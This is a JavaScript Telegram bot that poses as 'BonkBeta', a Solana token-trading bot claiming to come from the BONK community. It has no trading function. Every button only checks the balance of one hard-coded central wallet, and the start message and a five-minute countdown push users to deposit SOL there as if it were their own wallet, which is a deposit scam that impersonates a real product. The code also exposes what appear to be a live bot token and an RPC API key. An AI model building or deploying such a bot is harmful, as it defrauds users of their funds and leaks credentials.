const { Connection, PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');  // For making API calls

// Constants for connection
const connection = new Connection("https://side-bitter-hexagon.solana-mainnet.quiknode.pro/9a3cad7db13b550976afb441cac03c721131ff34"); // Using your HTTP provider
const bot = new Telegraf("7820695778:AAGPHv_3biiwZNG74jC2XjXPzLRt5RZzt-A");  // Replace with your actual bot token
const minBalanceThreshold = 0.1 * LAMPORTS_PER_SOL;
const userWalletAddress = "D8T2LnWE6dGJ8dCQSCLzzgRvGtLySAcdeWyCZzJF7vDA"; // Centralized wallet for deposits

// Utility to check balance
async function checkBalance() {
  const balance = await connection.getBalance(new PublicKey(userWalletAddress));
  return balance / LAMPORTS_PER_SOL;
}

// Function to handle low balance with clickable wallet address
async function lowBalanceHandler(ctx) {
  const balance = await checkBalance();
  if (balance < minBalanceThreshold) {
    await ctx.reply(
      `Low balance! Current balance: ${balance} SOL.\nPlease tap to copy the deposit address below and make a payment.`,
      Markup.inlineKeyboard([
        [Markup.button.url("Copy Deposit Address", `tg://msg?text=${userWalletAddress}`)],
        [Markup.button.callback("🔄 Refresh Balance", "refresh_balance")],
      ])
    );
    startCountdown(ctx, 5 * 60); // Start a 5-minute countdown for payment
    return true;
  }
  return false;
}

// Countdown function for payment
function startCountdown(ctx, seconds) {
  const interval = setInterval(async () => {
    if (seconds <= 0) {
      clearInterval(interval);
      await ctx.reply("Payment window has expired. Please initiate a new transaction if necessary.");
    } else {
      await ctx.reply(`You have ${Math.floor(seconds / 60)}m ${seconds % 60}s remaining to complete the payment.`);
      seconds -= 60;
    }
  }, 60000); // Update every minute
}

// Start command with updated inline menu
bot.start(async (ctx) => {
  await ctx.reply(
    "Welcome to BonkBeta\nSolana's fastest bot to trade any coin (SPL token), built by a team of friends from the BONK community.\n\nYou currently have no SOL balance. To get started with trading, send some SOL to your bonkbot wallet address:\n\nD8T2LnWE6dGJ8dCQSCLzzgRvGtLySAcdeWyCZzJF7vDA (tap to copy)\n\nOnce done tap refresh and your balance will appear here.\n\nTo buy a token just enter a token address, or even post the Birdeye or pump.fun link of the coin.\n\nFor more info on your wallet and to retrieve your private key, tap the wallet button below. We guarantee the safety of user funds on BONKBeta, but if you expose your private key your funds will not be safe.",
    Markup.inlineKeyboard([
      [Markup.button.callback("Buy", "wallet")],
      [Markup.button.callback("Sell & Manage", "wallet")],
      [Markup.button.callback("Help", "wallet"), Markup.button.callback("Refer Friends", "wallet"), Markup.button.callback("Alerts", "wallet")],
      [Markup.button.callback("Wallet", "wallet")],
      [Markup.button.callback("Settings", "wallet")],
      [Markup.button.callback("Pin", "wallet"), Markup.button.callback("Refresh", "refresh_balance")]
    ])
  );
});

// Inline button actions for each command
bot.action("wallet", async (ctx) => {
  const balance = await checkBalance();
  await ctx.reply(`Current wallet balance: ${balance} SOL.`);
  if (balance < minBalanceThreshold) {
    await lowBalanceHandler(ctx);
  }
});

// Action to refresh balance
bot.action("refresh_balance", async (ctx) => {
  const balance = await checkBalance();
  await ctx.reply(`Updated wallet balance: ${balance} SOL.`);
  if (balance < minBalanceThreshold) {
    await lowBalanceHandler(ctx);
  } else {
    await ctx.reply("Thank you for the payment. Your balance has been updated.");
  }
});

// Launch the bot
bot.launch();

// Graceful shutdown
process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));

console.log("BonkBeta Bot with inline buttons is running...");
